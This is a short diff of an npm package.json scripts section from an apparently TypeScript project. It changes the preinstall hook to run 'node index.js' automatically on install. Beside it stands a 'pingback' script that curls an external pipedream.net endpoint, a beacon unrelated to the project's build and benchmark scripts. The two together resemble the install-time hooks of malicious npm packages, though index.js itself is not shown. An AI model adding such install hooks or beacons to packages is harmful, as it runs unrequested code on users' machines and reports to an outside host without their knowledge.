@@ -195,7 +195,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "rollup -c",
-    "preinstall": "./pre.sh",
+    "preinstall": "node index.js",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "rollup -c -w",
     "coverage": "vitest run --coverage",
